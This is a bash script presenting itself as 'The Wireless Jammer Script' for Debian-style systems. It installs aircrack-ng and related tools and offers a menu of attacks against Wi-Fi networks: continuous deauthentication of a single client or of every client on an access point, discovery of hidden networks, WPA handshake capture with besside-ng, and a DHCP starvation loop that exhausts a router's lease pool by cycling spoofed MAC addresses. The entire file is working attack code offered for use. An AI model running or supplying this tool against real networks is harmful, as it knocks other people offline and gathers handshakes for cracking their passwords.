#!/bin/bash
# https://github.com/deadport/apkill
# Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks.
# Dependencies: net-tools, egrep, aircrack-ng, macchanger, curl

#Online check function
check_online()
{
online_stat=0
ping -w 2 -c 1 8.8.8.8 > /dev/null
if [ $? -lt 1 ]
then
    	online_stat=1
fi
}
#Dependency check
chan=0
if [ ! -d '/etc/apt' ]
	then
		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits." && sleep 20
fi
echo "checking for dependencies.. please wait"
if [ ! -f '/usr/bin/aircrack-ng' ]
	then
		echo "loading aircrack.."
		sudo apt install aircrack-ng -y > /dev/null
fi
if [ ! -f '/usr/bin/curl' ]
	then
		echo "loading curl.."
		sudo apt install curl -y > /dev/null
fi
if [ ! -f '/bin/egrep' ]
	then
		echo "loading egrep.."
		sudo apt install egrep -y > /dev/null
fi
if [ ! -f '/sbin/iwlist' ]
	then
		echo "loading net-tools.."
		sudo apt install net-tools iw -y > /dev/null
fi
if [ ! -d '/etc/macchanger' ]
	then
		echo "loading macchanger.."
		sudo apt install macchanger -y
fi
echo "dependency check done.." && clear
#end of dependencie check
clear
#artwork
tput setaf 1
echo "        / /\                /\ \       /\_\            /\ \       _\ \          _\ \   "
echo "       / /  \              /  \ \     / / /  _         \ \ \     /\__ \        /\__ \  "
echo "      / / /\ \            / /\ \ \   / / /  /\_\       /\ \_\   / /_ \_\      / /_ \_\ "
echo "     / / /\ \ \          / / /\ \_\ / / /__/ / /      / /\/_/  / / /\/_/     / / /\/_/ "
echo "    / / /  \ \ \        / / /_/ / // /\_____/ /      / / /    / / /         / / /      "
echo "   / / /___/ /\ \      / / /__\/ // /\_______/      / / /    / / /         / / /       "
echo "  / / /_____/ /\ \    / / /_____// / /\ \ \        / / /    / / / ____    / / / ____   "
echo " / /_________/\ \ \  / / /      / / /  \ \ \   ___/ / /__  / /_/_/ ___/\ / /_/_/ ___/\ "
echo "/ / /_       __\ \_\/ / /      / / /    \ \ \ /\__\/_/___\/_______/\__\//_______/\__\/ "
echo "\_\___\     /____/_/\/_/       \/_/      \_\_\\/_________/\_______\/    \_______\/     "
echo "		The Wireless Jammer Script for debianesque systems	"
echo "								                                        "
tput sgr0
#artwork end
#opt
echo "     		 	Choose an attack option:							"
echo "	[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
echo "	[DHCP starvation attack (5)					]"
echo "	"
echo "	"
echo "	"
echo "Choose [1-5]:" && read ask
if [ $ask -gt 5 ] || [ $ask -lt 1 ]		##Check
	then
		tput setaf 1
		echo "This option does not exist!"
		tput sgr0
		exit 1
fi
#opt end
#read interface
iwconfig
echo "Interface name(e.g. wlan0):"
read inter
if [ $ask -lt 5 ]
	then
		echo "Interface name in Monitor Mode?:"
		read monitor
fi
clear
#read interface end
#main
if [ $ask -eq 2 ] || [ $ask -eq 1 ]
	then
		echo "scanning networks.."
		sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
		echo "Choose Channel:"
		read chan
		echo "Please wait.. monitor mode is being enabled.."
		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
		sudo airmon-ng start $inter $chan > /dev/null
		echo "MAC of Access-Point:"
		read macacc
		echo "loading attack..."
		tput setaf 1
fi
#main end
#options
if [ $ask -eq 2 ]
	then
		sudo aireplay-ng -0 0 -a $macacc -b $macacc $monitor
		sudo airmon-ng stop $monitor > /dev/null
		tput sgr0
		exit 0
fi
while [ $ask -eq 1 ]
	do
		trap 'sudo airmon-ng stop $monitor > /dev/null && exit' INT
		vendor=y
		echo "How long should be searched for Clients? [sec]:"
		read secs
		echo "reading clients from network.. [scanning $secs seconds]"
		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $monitor
		echo "Client MAC:"
		while [ $vendor = y ]
		do
			read clientmac
			check_online > /dev/null
			if [ $online_stat = 1 ]
			then
			echo "Gathering vendor information.."
			curl "https://api.macvendors.com/$clientmac" && echo \n
			fi
			echo "Do you want to choose this client? [n/y]" 
			read vendor
			if [ $vendor = y ] || [ $vendor = Y ]
			then
				tput setaf 1
				sudo aireplay-ng -0 0 -a $macacc -c $clientmac $monitor
				sudo airmon-ng stop $monitor > /dev/null
				tput sgr0
			fi
		done
	done
if [ $ask -eq 3 ]
	then
		echo "How long to scan? [sec]:"
		read secs
		tput setaf 1
		echo "scanning.. [$secs sec]"
		sleep 2
		sudo airmon-ng start $inter > /dev/null && echo "enabling monitor mode.."
		sleep 2
		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $monitor &>> temp.txt
		clear
		tput sgr0
		echo "Hidden APs are:"
		echo "evaluating scan..." && cat temp.txt | grep length | uniq --check-chars=18
		echo "	"
		if [ -f 'temp.txt' ]
			then
				echo "scan successfull"
			else
				echo "scan error"
		fi
		sudo airmon-ng stop $monitor > /dev/null
		sleep 1
		sudo rm temp.txt
		exit 0
fi
if [ $ask -eq 4 ]
	then
		ask=0
		chan=0
		echo "Choose attack mode (1=Get all handshakes 2=Get specific handshakes)"
		read ask
		if [ $ask -eq 0 ] || [ $ask -gt 2 ]
			then
				echo "invalid option"
				exit 1
		fi
		if [ $ask -eq 1 ]
			then
				tput setaf 1
				sudo airmon-ng start $inter > /dev/null
				trap 'tput setaf 1 && echo "deactivating monitor mode.." && sudo airmon-ng stop $monitor > /dev/null && exit 1' INT
				sudo besside-ng $monitor
				tput sgr0
			else
				tput setaf 1
				sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
				echo "choose AP MAC:"
				read clientmac
				echo "choose AP Channel:"
				read chan
				sudo airmon-ng start $inter $chan > /dev/null
				trap 'tput setaf 1 && echo "deactivating monitor mode.." && sudo airmon-ng stop $monitor > /dev/null && exit 1' INT
				sudo besside-ng -b $clientmac $monitor
				tput sgr0
		fi
		sudo airmon-ng stop $monitor > /dev/null
fi
if [ $ask -eq 5 ]
	then
		cnt=0
   		online=1
		echo "To successfully perform this attack you must be connected to the destination AP!"
		tput setaf 1
		gate=$(/sbin/ip route | awk '/default/ { print $3 }')
		#start dhcp pool flooding
		resethost=$(hostname)
		echo "Hostname to use during attack?:"
		read hostatt
		while [ $online -eq 1 ]
			do
				echo "attack is running, this will take a while.."
				sudo hostname $hostatt
				sudo ifconfig $inter down && sleep 2
				sudo ip addr flush dev $inter
				sudo macchanger -a $inter
				sudo ifconfig $inter up
				sleep 4
				sudo dhclient -1 $inter
				if [ $? -eq 2 ]
					then
						online=0
				fi
				((cnt++))
				clear
				date=$(date)
				echo $cnt "DHCP leases gathered" $date
		done
		#end dhcp pool flooding
		sudo hostname $resethost
		echo "	"
		echo "The connection is interrupted!"
		echo "You may be out of reach or DHCP pool has been successfully flooded" 
		tput sgr0
fi
